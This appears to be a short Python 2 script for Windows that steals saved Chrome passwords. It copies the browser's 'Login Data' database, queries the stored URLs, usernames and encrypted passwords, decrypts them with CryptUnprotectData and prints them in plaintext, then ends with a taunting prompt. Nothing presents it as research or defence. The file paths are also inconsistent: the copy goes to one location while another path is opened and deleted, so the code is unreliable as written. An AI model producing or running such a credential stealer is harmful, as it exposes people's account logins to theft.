import sqlite3
from os import getenv
import shutil
import pywintypes
import win32crypt
import os


shutil.copy2(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "Login_Data.db")

conn = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login_Data.db")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')


for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    url = result[0]
    username = result[1]
    if password:
        print(url, username, password)

cursor.close()
del cursor
conn.close()

os.remove(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login_Data.db")
raw_input("How you like it now!!!")
